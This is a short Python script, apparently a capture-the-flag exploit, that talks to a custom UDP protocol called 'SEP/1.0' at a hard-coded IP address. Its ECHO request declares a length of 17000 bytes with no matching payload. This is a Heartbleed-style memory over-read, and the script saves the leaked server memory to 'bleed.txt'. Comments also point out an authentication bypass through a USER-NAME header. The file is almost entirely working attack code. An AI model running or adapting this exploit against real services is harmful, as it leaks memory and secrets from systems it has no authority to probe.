import socket
import time
import random
import string

def randomword(length):
   return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

#ip, port and socket
UDP_IP = "188.166.63.53"
UDP_PORT = 33443
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(5.0)

#HELLO message
MESSAGE = bytes("HELLO REQUEST SEP/1.0\r\n"
              + "TIME: " + str(int(time.time())) + "\r\n"
              + "USER-AGENT: \r\n"
             #+ "AUTHENTICATION: XVkK+++AAAAAA\r\n"
             #+ "USER-NAME: admin" #if contains user-name, authentication will be skipped
             #+ "ID: 12345" #server always return a another ID
, "utf-8")
sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
data = sock.recv(40960)
returnID = data.decode('unicode_escape').split('\r\n')[3].split(' ')[1]
print(data.decode('unicode_escape'))

#ECHO message
MESSAGE = bytes("ECHO REQUEST SEP/1.0\r\n"
              + "ID: " + returnID + "\r\n"
              + "TIME: " + str(int(time.time())) + "\r\n"
              + "USER-AGENT: \r\n"
              + "ECHO-LENGTH: 17000\r\n" #The key is here !!!
              + "ECHO: "
, "utf-8")
sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
try:
    data = sock.recv(50000)
except socket.timeout:
    data = bytes(" ", "utf-8");
    print("socket timeout")
file = open('bleed.txt', 'wb')
file.write(data)
file.close()

#BYE message
MESSAGE = bytes("BYE REQUEST SEP/1.0\r\n"
              + "ID: " + returnID + "\r\n"
              + "TIME: " + str(int(time.time())) + "\r\n"
              + "USER-AGENT: \r\n"
, "utf-8")
sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
data = sock.recv(4096)
print(data.decode('unicode_escape'))
